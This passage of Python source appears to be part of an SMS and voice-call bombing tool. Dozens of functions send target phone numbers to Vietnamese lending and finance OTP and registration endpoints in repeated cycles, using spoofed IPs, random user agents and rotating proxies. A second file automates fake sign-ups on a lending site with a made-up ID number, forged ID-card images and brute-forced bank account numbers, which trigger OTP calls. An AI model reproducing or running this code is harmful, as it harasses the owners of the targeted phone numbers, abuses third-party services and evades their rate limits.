        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
            response = await client.post(url, headers=headers, data=data)
        print(f"📡 Status: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"{e}")
        return False


async def hicash(phone):
    phone_formatted = phone.lstrip("0")
    url = "https://api.hicash.fun/v1/login/send/msm"
    headers = {
        "Host": "api.hicash.fun", "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://h5.hicash.fun",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://h5.hicash.fun/",
        "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted, "type": "2",
        "chntoken": "", "sourse": "1",
        "ip2": get_random_ip(), "ip3": get_random_ipv6(),
    }
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
            response = await client.post(url, headers=headers, data=data)
        print(f"📡 Status: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"{e}")
        return False

async def vayxanh(phone):
    headers_get = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "referer": "https://vayxanh.com/",
    }
    headers_post = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=utf-8",
        "origin": "https://lk.vayxanh.com",
        "referer": f"https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "x-request-id": str(uuid.uuid4()),
    }
    cookies = {}
    try:
        async with httpx.AsyncClient(verify=False, timeout=30, proxy=_current_proxy()) as cl:
            resp_get = await cl.get(
                "https://lk.vayxanh.com/",
                params={
                    "phone": phone, "amount": "2000000", "term": "7",
                    "utm_source": "direct_vayxanh", "utm_medium": "organic",
                    "utm_campaign": "direct_vayxanh", "utm_content": "mainpage_submit",
                },
                headers=headers_get, cookies=cookies,
            )
            cookies.update(dict(resp_get.cookies))
            r = await cl.post(
                "https://lk.vayxanh.com/internal/client/otp/send",
                cookies=cookies, headers=headers_post,
                json={"data": {"phone": phone, "code": "resend", "channel": "ivr"}},
            )
        ok = r.status_code == 200
        if ok:
            print(f"[VayXanh] ✅ OK")
        else:
            print(f"[VayXanh] ❌ HTTP {r.status_code}: {r.text[:100]}")
        return ok
    except Exception as e:
        print(f"[VayXanh] ERR {type(e).__name__}: {e}")
        return False


async def lotte(phone):
    identity = (
        f"0310"
        f"{random.randint(0, 99):02d}"
        f"0"
        f"{random.randint(0, 99):02d}"
        f"1"
        f"{random.randint(0, 99):02d}"
    )
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'User-Agent': random.choice(_XMH_UA_POOL),
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    }
    json_data = {
        'login': identity, 'phoneNumber': phone,
        'identityNumber': identity, 'changeRequired': True,
        'email': generate_email(),
    }
    try:
        async with _make_client(timeout=httpx.Timeout(30, connect=10), proxy=_current_proxy()) as client:
            r = await client.post(
                'https://digital.lottefinance.vn/lfd-api/api/account/register',
                headers=headers, json=json_data,
            )
        print(f"LOTTEFINANCE | -> OK [{r.status_code}]")
        return r.status_code == 200
    except Exception:
        print("LOTTEFINANCE | ~> Lỗi")
        return False


_FINVAY_HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Accept-Charset": "UTF-8",
    "Accept-Language": "vi-VN,vi;q=0.9",
    "User-Agent": "ktor-client",
}


async def Call_ConCac29(phone):
    try:
        async with _make_client(timeout=30, proxy=_current_proxy()) as client:
            r = await client.post(
                "https://h5web.thudofinance.com/fivios/finv/neglected",
                json={"phone": phone},
                headers=_FINVAY_HEADERS,
            )
        print(r.status_code)
        return r.status_code == 200
    except Exception:
        return False


async def main_10():
    phones = sys.argv[1:21]
    if not phones:
        print("Usage: python oki.py <phone1> [phone2] ...")
        sys.exit(1)

    print("[ChangeIP] Đang đổi IP proxy...")
    await _doi_ip()

    all_funcs = [
        (Call_Hedgyv,),
        (Call_VuiApp0,),
        (Call_MuaVayLoan,),
        (giaothong365_register,),
        (Call_SaoThinhVuong,),
        (Call_Reve_SMS,),
        (call8,),
        (Call_UVWallet,),
        (Call_Lavi_SMS,),
        (Call_MarVay_New,),
        (Call_VuiApp1,),
        (Call_NganNgan,),
        (Call_HTC_SMS,),
        (vaysuoi,),
        (Vay_Nhanh_SMS,),
        (Call_VnCreSms,),
        (Call_PTV_SMS,),
        (FB_Finance_SMS,),
        (Call_Vay24h,),
        (Call_Petro_SMS,),
        (Call_AChau_SMS,),
        (anvay,),
        (Call_HappyGoo,),
        (Call_HappyGoo_Voice,),
        (Call_SenVay,),
        (Call_LuckyTien,),
        (Call_LuckyTien_Voice,),
        (Call_EasyOkVN,),
        (Call_EasyOkVN_Voice,),
        (Call_VuiApp,),
        (Call_ITake,),
        (Call_QQ_SMS,),
        (seabankasset,),
        (vaygo,),
        (Call_Izion24_SMS,),
        (Call_Izion24_Voice,),
        (Call_ConCac27,),
        (Call_Tien24hPro,),
        (giaothong365_forgot,),
        (Call_Wan_SMS,),
        (Call_VNCreCall,),
        (Call_FinVuiTeck,),
        (Call_MarVay_SMS,),
        (Call_TuiTien,),
        (Call_MoneyCashLoan,),
        (Call_V88Dong,),
        (Call_V88DongVoice,),
        (hicash,),
        (lotte,),
        (Call_ConCac29,),
        (vnadmin_2,),
        (Call_VayDep365,),
        (sentSms_FvBanana,),
        (sentSms1,),
        (vayxanh,),
        (vnadmin_1,),
        (vnadmin_3,),
    ]

    async def safe_call(func, phone):
        try:
            return await asyncio.wait_for(func(phone), timeout=25)
        except Exception as e:
            print(f"[{func.__name__}] ERR {type(e).__name__}: {e}")
            return False

    # Số vòng lặp
    max_cycles = int(sys.argv[2]) if len(sys.argv) > 2 else 3
    # Hoặc có thể set cứng
    # max_cycles = 5

    cycle = 0
    while cycle < max_cycles:
        cycle += 1
        print(f"\n{'='*50}\n[VÒNG {cycle}/{max_cycles}] Bắt đầu {len(all_funcs)} hàm\n{'='*50}")
        
        for func, *_ in all_funcs:
            results = await asyncio.gather(*[safe_call(func, phone) for phone in phones])
            if any(results):
                print(f"[{func.__name__}] ✅ OK — đợi 2s -> 8s ")
                await asyncio.sleep(random.randint(6, 8))
        
        print(f"[VÒNG {cycle}/{max_cycles}] Hoàn thành.")
        
        # Đổi IP sau mỗi vòng (tùy chọn)
        if cycle < max_cycles:
            print(f"[ChangeIP] Đang đổi IP proxy cho vòng {cycle + 1}...")
            await _doi_ip()
            await asyncio.sleep(random.randint(3, 5))

    print(f"\n✅ Đã chạy đủ {max_cycles} vòng, dừng chương trình.")



# ============================================================
# FILE 11
# ============================================================
import os
import time
import random
import sys
import subprocess

def auto_install_packages():
    packages = ['selenium', 'fake-useragent']
    for package in packages:
        try:
            if package == 'fake-useragent':
                __import__('fake_useragent')
            else:
                __import__(package)
            print(f"✅ {package} đã được cài đặt")
        except ImportError:
            print(f"📦 Đang cài đặt {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
            print(f"✅ Đã cài đặt {package}")

auto_install_packages()

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.edge.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from fake_useragent import UserAgent

ua = UserAgent()

NGAY_SINH = "30.04.1999"
SO_CCCD = "049234928948"
SO_DT_NGUOI_THAN = "948487344"
SO_DT_TUYEN_DUNG = "912345678"
EMAIL = "huutinh1976743@gmail.com"
HO_TEN = "Nguyễn Văn A"

cac_hang = ["Iphone", "Samsung", "Oppo", "Xiaomi"]

def tao_file_anh_gia(path, kich_thuoc=(800, 600)):
    try:
        with open(path, 'wb') as f:
            f.write(b'\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x60\x00\x60\x00\x00\xFF\xDB\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0A\x0A\x09\x08\x09\x09\x0A\x0C\x0F\x0C\x0A\x0B\x0E\x0B\x09\x09\x0D\x11\x0D\x0E\x0F\x10\x10\x11\x10\x0A\x0C\x12\x13\x12\x10\x13\x0F\x10\x10\x10\xFF\xC0\x00\x0B\x08\x02\x58\x02\x58\x01\x01\x11\x00\xFF\xC4\x00\x1F\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5\x10\x00\x02\x01\x03\x03\x02\x04\x03\x05\x05\x04\x04\x00\x00\x01\x7D\x01\x02\x03\x00\x04\x11\x05\x12\x21\x31\x41\x51\x61\x07\x22\x71\x14\x32\x81\x91\xA1\x08\x23\x42\xB1\xC1\x15\x52\xD1\xF0\x24\x33\x62\x72\x82\x09\x0A\x16\x17\x18\x19\x1A\x25\x26\x27\x28\x29\x2A\x34\x35\x36\x37\x38\x39\x3A\x43\x44\x45\x46\x47\x48\x49\x4A\x53\x54\x55\x56\x57\x58\x59\x5A\x63\x64\x65\x66\x67\x68\x69\x6A\x73\x74\x75\x76\x77\x78\x79\x7A\x83\x84\x85\x86\x87\x88\x89\x8A\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF\xC4\x00\x1F\x01\x00\x03\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5\x11\x00\x02\x01\x02\x04\x04\x03\x04\x07\x05\x04\x04\x00\x01\x02\x77\x00\x01\x02\x03\x11\x04\x05\x21\x31\x06\x12\x41\x51\x61\x07\x71\x13\x22\x32\x81\x08\x14\x42\x91\xA1\xB1\xC1\x09\x23\x33\x52\xF0\x15\x62\x72\xD1\x0A\x16\x24\x34\xE1\x25\xF1\x17\x18\x19\x1A\x26\x27\x28\x29\x2A\x35\x36\x37\x38\x39\x3A\x43\x44\x45\x46\x47\x48\x49\x4A\x53\x54\x55\x56\x57\x58\x59\x5A\x63\x64\x65\x66\x67\x68\x69\x6A\x73\x74\x75\x76\x77\x78\x79\x7A\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF\xDA\x00\x0C\x03\x01\x00\x02\x11\x03\x11\x00\x3F\x00')
            for i in range(100):
                f.write(b'\xFF' * 1000)
        print(f"✅ Đã tạo file ảnh giả: {path}")
        return True
    except Exception as e:
        print(f"❌ Lỗi tạo ảnh giả: {e}")
        return False

PATH_ANH_1 = r"C:\Users\Administrator\Downloads\cccd_truoc.jpg"
PATH_ANH_2 = r"C:\Users\Administrator\Downloads\cccd_sau.jpg"
PATH_ANH_3 = r"C:\Users\Administrator\Downloads\chan_dung.jpg"

if not os.path.exists(PATH_ANH_1):
    print("📁 Tạo ảnh giả cho CCCD...")
    temp_dir = os.environ.get('TEMP', r'C:\Users\Administrator\Downloads')
    PATH_ANH_1 = os.path.join(temp_dir, 'cccd_truoc.jpg')
    PATH_ANH_2 = os.path.join(temp_dir, 'cccd_sau.jpg')
    PATH_ANH_3 = os.path.join(temp_dir, 'chan_dung.jpg')
    tao_file_anh_gia(PATH_ANH_1)
    tao_file_anh_gia(PATH_ANH_2)
    tao_file_anh_gia(PATH_ANH_3)

def random_so_tai_khoan():
    so_chu_so = random.choice([8, 9, 10])
    so_tk = ''.join([str(random.randint(0, 9)) for _ in range(so_chu_so)])
    return so_tk, so_chu_so

def kiem_tra_loi_sau_tiep_tuc(driver):
    time.sleep(1.5)
    try:
        loi_element = driver.find_element(By.XPATH, "//*[contains(text(), 'không được để trống') or contains(text(), 'không hợp lệ')]")
        if loi_element.is_displayed():
            return True
    except:
        pass
    return False

def dong_popup(driver):
    try:
        driver.execute_script("""
            var popups = document.querySelectorAll('.modal, .popup, .overlay, [role="dialog"]');
            for(var i=0; i<popups.length; i++) {
                if(popups[i].style.display !== 'none' && popups[i].style.visibility !== 'hidden') {
                    popups[i].style.display = 'none';
                    var closeBtn = popups[i].querySelector('.close, [aria-label="Close"]');
                    if(closeBtn) closeBtn.click();
                }
            }
        """)
        time.sleep(0.5)
        return True
    except:
        return False

def upload_anh_va_otp(driver, lan):
    print("\n" + "="*60)
    print(f"📸 LẦN {lan} - UPLOAD ẢNH CCCD VÀ NHẬN OTP")
    print("="*60)
    
    driver.execute_script("window.scrollTo(0, 0);")
    time.sleep(2)
    
    file_inputs = driver.find_elements(By.XPATH, "//input[@type='file']")
    print(f"📁 Tìm thấy {len(file_inputs)} input file")
    
    anh_paths = [PATH_ANH_1, PATH_ANH_2, PATH_ANH_3]
    for i in range(min(3, len(file_inputs))):
        try:
            if os.path.exists(anh_paths[i]):
                file_inputs[i].send_keys(anh_paths[i])
                print(f"✅ Đã upload ảnh {i+1}: {os.path.basename(anh_paths[i])}")
            else:
                tao_file_anh_gia(anh_paths[i])
                file_inputs[i].send_keys(anh_paths[i])
                print(f"✅ Đã tạo và upload ảnh {i+1}")
            time.sleep(1)
        except Exception as e:
            print(f"❌ Lỗi upload ảnh {i+1}: {e}")
    
    print("\n📱 XÁC THỰC OTP...")
    time.sleep(3)
    
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    time.sleep(2)
    
    clicked = False
    
    cac_tu_tim = ["cuộc gọi", "gọi điện", "call", "voice call"]
    
    for tu in cac_tu_tim:
        if clicked:
            break
        try:
            otp_btn = driver.find_element(By.XPATH, f"//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{tu}')]")
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", otp_btn)
            time.sleep(0.5)
            driver.execute_script("arguments[0].click();", otp_btn)
            print(f"📞 Đã ấn nút chứa '{tu}'")
            clicked = True
            break
        except:
            continue
    
    if not clicked:
        try:
            buttons = driver.find_elements(By.TAG_NAME, "button")
            for btn in buttons:
                text_btn = btn.text.lower()
                if ("gọi" in text_btn or "cuộc" in text_btn or "call" in text_btn) and "zalo" not in text_btn:
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].click();", btn)
                    print(f"📞 Đã ấn nút cuộc gọi: '{btn.text}'")
                    clicked = True
                    break
        except:
            pass
    
    if not clicked:
        try:
            driver.execute_script("""
                var btns = document.querySelectorAll('button');
                for(var i=0; i<btns.length; i++) {
                    var txt = btns[i].innerText.toLowerCase();
                    if((txt.includes('gọi') || txt.includes('cuộc') || txt.includes('call')) && !txt.includes('zalo')) {
                        btns[i].scrollIntoView({block: 'center'});
                        btns[i].click();
                        return true;
                    }
                }
            """)
            print("📞 Đã click nút cuộc gọi bằng JavaScript")
            clicked = True
        except:
            pass
    
    if not clicked:
        print("❌ KHÔNG TÌM THẤY NÚT CUỘC GỌI!")
    
    print("\n⏳ Chờ 10 giây để OTP được gửi qua cuộc gọi...")
    time.sleep(10)

def click_dang_ky_ngay(driver):
    print("🔍 Đang tìm nút Đăng ký Ngay...")
    
    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "button"))
        )
    except:
        pass
    
    for _ in range(3):
        try:
            driver.execute_script("""
                var popups = document.querySelectorAll('[class*="popup"], [class*="modal"], [class*="overlay"]');
                for(var i=0; i<popups.length; i++) {
                    if(popups[i].style.display !== 'none') {
                        popups[i].style.display = 'none';
                    }
                }
            """)
        except:
            pass
        time.sleep(0.3)
    
    cac_cach_tim = [
        (By.XPATH, "//button[contains(text(), 'Đăng ký')]"),
        (By.XPATH, "//button[contains(text(), 'Đăng Ký')]"),
        (By.XPATH, "//button[contains(text(), 'dang ky')]"),
        (By.XPATH, "//button[contains(@class, 'register')]"),
        (By.XPATH, "//button[contains(@class, 'submit')]"),
        (By.XPATH, "//button[@type='submit']"),
        (By.XPATH, "//div[contains(@class, 'btn')]//button"),
        (By.XPATH, "//*[contains(text(), 'Đăng ký Ngay')]"),
        (By.XPATH, "//*[text()='Đăng ký Ngay']"),
    ]
    
    for by, selector in cac_cach_tim:
        try:
            buttons = driver.find_elements(by, selector)
            for btn in buttons:
                if btn.is_displayed():
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center', behavior: 'smooth'});", btn)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].click();", btn)
                    print(f"✅ Đã nhấn nút Đăng ký: {btn.text if btn.text else selector}")
                    return True
        except:
            continue
    
    try:
        result = driver.execute_script("""
            var btns = document.querySelectorAll('button');
            for(var i=0; i<btns.length; i++) {
                var txt = btns[i].innerText.toLowerCase();
                if(txt.includes('đăng ký') || txt.includes('dang ky')) {
                    btns[i].scrollIntoView({block: 'center'});
                    btns[i].click();
                    return true;
                }
            }
            var divs = document.querySelectorAll('div[role="button"], div.clickable, a');
            for(var i=0; i<divs.length; i++) {
                var txt = divs[i].innerText.toLowerCase();
                if(txt.includes('đăng ký') || txt.includes('dang ky')) {
                    divs[i].scrollIntoView({block: 'center'});
                    divs[i].click();
                    return true;
                }
            }
            return false;
        """)
        if result:
            print("✅ Đã nhấn nút Đăng ký bằng JavaScript")
            return True
    except:
        pass
    
    print("\n🔍 DEBUG: Tất cả button trên trang:")
    buttons = driver.find_elements(By.TAG_NAME, "button")
    for i, btn in enumerate(buttons):
        print(f"   Button {i}: text='{btn.text}', display={btn.is_displayed()}")
    
    print("❌ KHÔNG TÌM THẤY NÚT ĐĂNG KÝ!")
    return False

def thuc_hien_mot_lan(driver, lan, so_dien_thoai):
    print("\n" + "="*60)
    print(f"🔄 LẦN {lan} - BẮT ĐẦU ĐĂNG KÝ")
    print(f"📞 Số điện thoại: {so_dien_thoai}")
    print("="*60)
    
    random_ua = ua.random
    
    dong_popup(driver)
    
    print("\n🏠 TRANG CHỦ")
    driver.get("https://money-cat.net/")
    time.sleep(5)
    
    dong_popup(driver)
    
    for _ in range(5):
        webdriver.ActionChains(driver).send_keys(Keys.ESCAPE).perform()
        time.sleep(0.3)
    
    dong_popup(driver)
    time.sleep(1)
    
    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "input"))
        )
    except:
        pass
    
    inputs = driver.find_elements(By.TAG_NAME, "input")
    print(f"📝 Tìm thấy {len(inputs)} input")
    
    if len(inputs) >= 3:
        for i in range(3):
            try:
                if inputs[i].is_displayed() and inputs[i].is_enabled():
                    driver.execute_script("arguments[0].value = '';", inputs[i])
                    time.sleep(0.2)
                else:
                    print(f"⚠️ Input {i+1} không hiển thị hoặc bị disable")
            except:
                print(f"⚠️ Không thể clear input {i+1}")
        
        try:
            inputs[0].send_keys(HO_TEN)
            print(f"✅ Họ tên: {HO_TEN}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[0], HO_TEN)
            print(f"✅ Họ tên (JS): {HO_TEN}")
        
        try:
            inputs[1].send_keys(so_dien_thoai)
            print(f"✅ Số điện thoại: {so_dien_thoai}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[1], so_dien_thoai)
            print(f"✅ Số điện thoại (JS): {so_dien_thoai}")
        
        try:
            inputs[2].send_keys(EMAIL)
            print(f"✅ Email: {EMAIL}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[2], EMAIL)
            print(f"✅ Email (JS): {EMAIL}")
        
        driver.execute_script("document.activeElement?.blur(); document.body.click();")
        time.sleep(1)
    else:
        print(f"❌ Không đủ input (cần 3, có {len(inputs)})")
        return False
    
    print("\n🖱️ ĐANG CLICK NÚT ĐĂNG KÝ NGAY...")
    click_dang_ky_ngay(driver)
    
    print("\n⏳ ĐỢI TRANG CHUYỂN HƯỚNG (TỐI ĐA 20 GIÂY)...")
    
    da_chuyen = False
    for i in range(20):
        time.sleep(1)
        current_url = driver.current_url
        if "reg/personal" in current_url:
            print(f"✅ Đã chuyển sang trang: {current_url}")
            da_chuyen = True
            break
        if "reg" in current_url:
            print(f"✅ Đã chuyển sang: {current_url}")
            da_chuyen = True
            break
        if i == 5:
            print("   ⚠️ Vẫn đang đợi, thử click lại...")
            click_dang_ky_ngay(driver)
        if i == 10:
            print("   ⚠️ Đợi lâu hơn, kiểm tra lại...")
    
    if not da_chuyen:
        print(f"⚠️ Không chuyển được trang, URL hiện tại: {driver.current_url}")
        print("⚠️ Thử lại lần cuối...")
        click_dang_ky_ngay(driver)
        time.sleep(5)
        if "reg" in driver.current_url:
            print(f"✅ Đã chuyển sau khi thử lại: {driver.current_url}")
        else:
            print("❌ VẪN KHÔNG CHUYỂN ĐƯỢC TRANG!")
            return False
    
    time.sleep(2)
    
    print("\n📝 TRANG ĐĂNG KÝ CÁ NHÂN")
    time.sleep(3)
    
    for _ in range(5):
        driver.find_element(By.TAG_NAME, "body").send_keys(Keys.ESCAPE)
        time.sleep(0.2)
    
    dong_popup(driver)
    time.sleep(1)
    
    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "input"))
        )
    except:
        pass
    
    inputs = driver.find_elements(By.TAG_NAME, "input")
    print(f"📝 Tìm thấy {len(inputs)} input ở trang cá nhân")
    
    if len(inputs) >= 2:
        try:
            if inputs[0].is_displayed() and inputs[0].is_enabled():
                driver.execute_script("arguments[0].value = '';", inputs[0])
                inputs[0].send_keys(NGAY_SINH)
                print(f"✅ Ngày sinh: {NGAY_SINH}")
            else:
                driver.execute_script("arguments[0].value = arguments[1];", inputs[0], NGAY_SINH)
                print(f"✅ Ngày sinh (JS): {NGAY_SINH}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[0], NGAY_SINH)
            print(f"✅ Ngày sinh (JS): {NGAY_SINH}")
        
        try:
            if inputs[1].is_displayed() and inputs[1].is_enabled():
                driver.execute_script("arguments[0].value = '';", inputs[1])
                inputs[1].send_keys(SO_CCCD)
                print(f"✅ CCCD: {SO_CCCD}")
            else:
                driver.execute_script("arguments[0].value = arguments[1];", inputs[1], SO_CCCD)
                print(f"✅ CCCD (JS): {SO_CCCD}")
        except:
            driver.execute_script("arguments[0].value = arguments[1];", inputs[1], SO_CCCD)
            print(f"✅ CCCD (JS): {SO_CCCD}")
        time.sleep(1)
    
    try:
        driver.find_element(By.XPATH, "//*[text()='Nam']").click()
        print("✅ Giới tính: Nam")
    except:
        try:
            driver.find_element(By.XPATH, "//*[contains(text(), 'Nam')]").click()
            print("✅ Giới tính: Nam")
        except:
            print("⚠️ Không chọn được giới tính")
    
    comboboxes = driver.find_elements(By.XPATH, "//button[@role='combobox']")
    if len(comboboxes) > 0:
        tinh_thanh = comboboxes[0]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", tinh_thanh)
        time.sleep(0.5)
        tinh_thanh.click()
        print("📍 Đã mở dropdown Tỉnh/Thành")
        time.sleep(1)
        try:
            driver.find_element(By.XPATH, "//*[text()='Bac Giang']").click()
            print("✅ Đã chọn: Bắc Giang")
        except:
            driver.find_element(By.XPATH, "//*[contains(text(), 'Bac Giang')]").click()
            print("✅ Đã chọn: Bắc Giang")
        time.sleep(0.5)
    
    print("\n📱 Chọn hãng điện thoại...")
    if len(comboboxes) > 1:
        hieu_dt = comboboxes[1]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", hieu_dt)
        time.sleep(0.5)
        
        for hang in cac_hang:
            try:
                print(f"   🔄 Đang thử: {hang}")
                driver.execute_script("arguments[0].click();", hieu_dt)
                time.sleep(1)
                driver.find_element(By.XPATH, f"//*[text()='{hang}']").click()
                print(f"   ✅ Đã chọn: {hang}")
                time.sleep(1)
                break
            except:
                try:
                    driver.execute_script("arguments[0].click();", hieu_dt)
                    time.sleep(1)
                    driver.find_element(By.XPATH, f"//*[contains(text(), '{hang}')]").click()
                    print(f"   ✅ Đã chọn: {hang}")
                    time.sleep(1)
                    break
                except:
                    print(f"   ❌ Không chọn được {hang}")
                    continue
    
    print("\n📞 Nhập số điện thoại...")
    time.sleep(1)
    
    tat_ca_input_tel = driver.find_elements(By.XPATH, "//input[@type='tel']")
    print(f"📝 Tìm thấy {len(tat_ca_input_tel)} input type=tel")
    
    if len(tat_ca_input_tel) > 2:
        so_nguoi_than = tat_ca_input_tel[2]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", so_nguoi_than)
        time.sleep(0.5)
        so_nguoi_than.click()
        time.sleep(0.3)
        driver.execute_script("arguments[0].value = '';", so_nguoi_than)
        so_nguoi_than.send_keys(SO_DT_NGUOI_THAN)
        print(f"✅ Số người thân: {SO_DT_NGUOI_THAN}")
    
    if len(tat_ca_input_tel) > 3:
        so_tuyen_dung = tat_ca_input_tel[3]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", so_tuyen_dung)
        time.sleep(0.5)
        so_tuyen_dung.click()
        time.sleep(0.3)
        driver.execute_script("arguments[0].value = '';", so_tuyen_dung)
        so_tuyen_dung.send_keys(SO_DT_TUYEN_DUNG)
        print(f"✅ Số tuyển dụng: {SO_DT_TUYEN_DUNG}")
    
    print("\n🏦 Chọn Tên Ngân Hàng...")
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight - 400);")
    time.sleep(2)
    
    tat_ca_combobox = driver.find_elements(By.XPATH, "//button[@role='combobox']")
    print(f"   📍 Tìm thấy {len(tat_ca_combobox)} combobox")
    
    if len(tat_ca_combobox) > 2:
        ngan_hang_combobox = tat_ca_combobox[2]
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", ngan_hang_combobox)
        time.sleep(0.5)
        ngan_hang_combobox.click()
        print("   ✅ Đã mở dropdown ngân hàng")
        time.sleep(1.5)
        
        try:
            options = driver.find_elements(By.CSS_SELECTOR, "li[role='option']")
            if not options:
                options = driver.find_elements(By.CSS_SELECTOR, "ul li")
            if not options:
                options = driver.find_elements(By.CSS_SELECTOR, "[role='option']")
            
            if options:
                driver.execute_script("arguments[0].click();", options[0])
                print(f"   ✅ Đã chọn: {options[0].text[:50]}...")
            else:
                driver.find_element(By.XPATH, "//*[contains(text(), 'Vietcombank')]").click()
                print("   ✅ Đã chọn Vietcombank")
            time.sleep(1)
        except Exception as e:
            print(f"   ❌ Lỗi chọn ngân hàng: {e}")
    
    print("\n💰 NHẬP SỐ TÀI KHOẢN (RANDOM 8/9/10 SỐ)")
    
    tat_ca_input_text = driver.find_elements(By.TAG_NAME, "input")
    so_tk_input = None
    
    for inp in reversed(tat_ca_input_text):
        if inp.is_displayed() and inp.is_enabled():
            so_tk_input = inp
            break
    
    if not so_tk_input:
        print("❌ Không tìm thấy ô nhập số tài khoản!")
        return False
    
    thanh_cong = False
    so_lan_thu = 0
    max_lan = 30
    
    while not thanh_cong and so_lan_thu < max_lan:
        so_lan_thu += 1
        so_tk, so_chu_so = random_so_tai_khoan()
        print(f"\n🔄 Thử số {so_lan_thu}/{max_lan}: {so_tk} ({so_chu_so} số)")
        
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", so_tk_input)
        time.sleep(0.3)
        driver.execute_script("arguments[0].value = '';", so_tk_input)
        so_tk_input.send_keys(so_tk)
        time.sleep(0.5)
        
        driver.execute_script("document.activeElement?.blur(); document.body.click();")
        time.sleep(1)
        
        try:
            tiep_tuc = driver.find_element(By.XPATH, "//button[normalize-space()='Tiếp tục']")
            if tiep_tuc.is_displayed() and tiep_tuc.is_enabled():
                driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", tiep_tuc)
                time.sleep(0.5)
                driver.execute_script("arguments[0].click();", tiep_tuc)
                print(f"   ⏩ Đã ấn Tiếp tục")
                time.sleep(2)
            else:
                print(f"   ❌ Nút Tiếp tục không thể click!")
                continue
        except:
            print(f"   ❌ Không tìm thấy nút Tiếp tục!")
            continue
        
        co_loi = kiem_tra_loi_sau_tiep_tuc(driver)
        
        if co_loi:
            print(f"   ❌ Số {so_tk} không hợp lệ. Thử số khác...")
        else:
            try:
                tiep_tuc_check = driver.find_element(By.XPATH, "//button[normalize-space()='Tiếp tục']")
                print(f"   ⚠️ Vẫn còn nút Tiếp tục, thử lại...")
                continue
            except:
                thanh_cong = True
